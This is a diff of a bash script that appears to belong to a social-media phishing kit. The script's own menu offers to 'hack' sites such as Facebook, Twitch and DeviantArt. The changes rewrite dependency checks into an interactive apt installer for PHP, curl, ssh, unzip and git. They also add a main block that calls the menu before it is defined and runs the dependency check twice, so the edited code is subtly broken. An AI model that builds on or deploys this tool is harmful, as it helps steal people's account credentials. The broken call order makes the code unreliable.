@@ -5,15 +5,85 @@
 
 # Join Telegram Group for help: http://t.me/linux_repo
 
-
-trap 'printf "\n";stop;exit 1' 2
+trap 'printf "\n"; stop; exit 1' 2
 
 dependencies() {
-command -v php > /dev/null 2>&1 || { echo >&2 "PHP is not installed ! Install it."; exit 1; }
-command -v curl > /dev/null 2>&1 || { echo >&2 "Curl is not installed ! Install it."; exit 1; }
-command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh is not installed ! Install it"; exit 1; }
-command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip is not installed ! Install it"; exit 1; }
+    # Check and install dependencies if not installed
+    install_dependencies() {
+        echo "Installing missing dependencies..."
+        
+        # Install PHP
+        if ! command -v php > /dev/null 2>&1; then
+            echo "PHP is not installed. Installing PHP..."
+            sudo apt-get install -y php || { echo "Failed to install PHP"; exit 1; }
+        fi
+        
+        # Install Curl
+        if ! command -v curl > /dev/null 2>&1; then
+            echo "Curl is not installed. Installing Curl..."
+            sudo apt-get install -y curl || { echo "Failed to install Curl"; exit 1; }
+        fi
+        
+        # Install OpenSSH
+        if ! command -v ssh > /dev/null 2>&1; then
+            echo "OpenSSH is not installed. Installing OpenSSH..."
+            sudo apt-get install -y openssh-client || { echo "Failed to install OpenSSH"; exit 1; }
+        fi
+        
+        # Install Unzip
+        if ! command -v unzip > /dev/null 2>&1; then
+            echo "Unzip is not installed. Installing Unzip..."
+            sudo apt-get install -y unzip || { echo "Failed to install Unzip"; exit 1; }
+        fi
+        
+        # Install Git
+        if ! command -v git > /dev/null 2>&1; then
+            echo "Git is not installed. Installing Git..."
+            sudo apt-get install -y git || { echo "Failed to install Git"; exit 1; }
+        fi
+    }
+
+    # Check for dependencies
+    missing_dependencies=0
+    if ! command -v php > /dev/null 2>&1; then
+        echo "PHP is not installed."
+        missing_dependencies=1
+    fi
+    if ! command -v curl > /dev/null 2>&1; then
+        echo "Curl is not installed."
+        missing_dependencies=1
+    fi
+    if ! command -v ssh > /dev/null 2>&1; then
+        echo "OpenSSH is not installed."
+        missing_dependencies=1
+    fi
+    if ! command -v unzip > /dev/null 2>&1; then
+        echo "Unzip is not installed."
+        missing_dependencies=1
+    fi
+    if ! command -v git > /dev/null 2>&1; then
+        echo "Git is not installed."
+        missing_dependencies=1
+    fi
+
+    # Prompt user to install missing dependencies
+    if [ $missing_dependencies -eq 1 ]; then
+        read -p "Do you want to install the missing dependencies? (y/n): " response
+        if [[ "$response" =~ ^[Yy]$ ]]; then
+            install_dependencies
+        else
+            echo "Please install the missing dependencies manually to continue."
+            exit 1
+        fi
+    else
+        echo -e "\n"  # Add space above
+        echo -e "\e[38;5;172mAll dependencies are installed.\e[0m"  # Dark yellow color
+        echo -e "\n"  # Add space below
+    fi
 }
+
+dependencies
+
 
 loading() {
 clear
@@ -84,6 +154,10 @@ printf " \n"
 printf " \e[36;1m.:. Choose any social site which you want to hack .:.\e[0m\n"
 printf " \n"
 }
+
+# Main Execution
+dependencies
+menu
 
 menu() {
 printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Facebook     \e[0m\e[1;31m[\e[0m\e[1;77m11\e[0m\e[1;31m]\e[0m\e[1;93m Twitch       \e[0m\e[1;31m[\e[0m\e[1;77m21\e[0m\e[1;31m]\e[0m\e[1;93m DeviantArt\e[0m\n"
